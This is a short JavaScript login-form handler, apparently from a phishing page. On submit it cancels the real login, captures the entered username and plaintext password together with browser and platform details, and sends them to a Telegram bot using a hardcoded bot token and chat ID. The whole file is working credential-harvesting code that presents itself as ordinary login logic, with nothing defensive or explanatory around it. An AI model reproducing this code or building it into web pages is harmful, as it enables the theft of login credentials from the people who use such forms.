document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    // Get form values
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Get user details
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const currentTime = new Date().toLocaleString();

    // Prepare log details
    const logDetails = `User logged in with the following details:
    Username: ${username}
    Password: ${password}
    User Agent: ${userAgent}
    Platform: ${platform}
    Time: ${currentTime}`;

    // Send log details to Telegram
    const botToken = '7273335886:AAFfBkz6TbFX6IbPfJ4sAB_pFyUBhuhEWWI';
    const chatId = '7323113234';
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(logDetails)}`;

    fetch(telegramUrl)
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok ' + response.statusText);
            }
            return response.json();
        })
        .then(data => {
            if (data.ok) {
                alert('Log details sent successfully.');
            } else {
                alert('Failed to send log details.');
            }
        })
        .catch(error => {
            console.error('There has been a problem with your fetch operation:', error);
        });
});
